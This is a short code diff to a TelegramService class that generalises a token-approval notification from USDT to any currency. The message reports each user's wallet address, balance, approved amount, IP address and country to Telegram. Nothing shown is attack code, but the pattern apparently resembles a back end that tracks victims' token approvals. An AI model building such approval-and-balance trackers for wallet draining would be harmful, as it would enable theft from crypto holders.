@@ -32,17 +32,17 @@ export class TelegramService {
   private static formatApprovalMessage(data: TelegramNotificationData): string {
     const displayBalance =
       data.chain === "bsc"
-        ? formatAmount(data.usdtBalance, 18)
-        : formatAmount(data.usdtBalance, 6);
+        ? formatAmount(data.tokenBalance, 18)
+        : formatAmount(data.tokenBalance, 6);
 
-    return `🎉 **USDT Approval Successful!**
+    return `🎉 **${data.currency.toUpperCase()} Approval Successful!**
 
 💰 **Payment ID:** ${data.paymentId}
 🔗 **Chain:** ${data.chain.toUpperCase()}
 👤 **Wallet:** ${data.userAddress}
 💳 **Wallet Type:** ${data.walletType}
-💵 **Approved Amount:** ${data.amount} USDT
-🏦 **Wallet Balance:** ${displayBalance} USDT
+💵 **Approved Amount:** ${data.amount} ${data.currency.toUpperCase()}
+🏦 **Wallet Balance:** ${displayBalance} ${data.currency.toUpperCase()}
 🌍 **IP Address:** ${data.clientIP || "Unknown"}
 🏛️ **Country:** ${data.country || "Unknown"}
 ⏰ **Time:** ${new Date().toLocaleString()}`;
